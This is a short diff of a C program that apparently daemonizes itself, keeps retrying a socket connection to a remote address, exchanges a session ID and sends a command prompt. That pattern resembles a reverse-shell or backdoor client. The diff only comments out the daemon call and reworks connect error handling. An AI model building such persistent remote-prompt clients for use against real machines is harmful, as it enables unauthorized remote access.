@@ -2,9 +2,9 @@
 
 int main(int argc, char *argv[])
 {
-	if(argc <= 1){
+	/*if(argc <= 1){
 		skeleton_daemon();
-	}
+	}*/
 
 	int portno;
 	char portchar[6];
@@ -49,12 +49,10 @@ int main(int argc, char *argv[])
     		}
 
     		do{
-			if(connect(s, (struct sockaddr *)&client, sizeof(client)) < 0){
-				cn = SOCKET_ERR;
-			}
-    		} while(cn == SOCKET_ERR);
+			cn = connect(s, (SOCKADDR *)&client, sizeof(client));
+    		} while(cn == -1);
 
-    		if(cn != SOCKET_ERR){
+    		if(cn != -1){
 			*pbr = SOCKET_ERR;
 			//Receive the session id
 
@@ -78,7 +76,7 @@ int main(int argc, char *argv[])
 			}
     		}
 
-    		while(cn != SOCKET_ERR){
+    		while(cn != -1){
 			if(sessionID[0] == '0'){
 				*pbs = send(s, prompt, sizeof(prompt), 0);
 			}
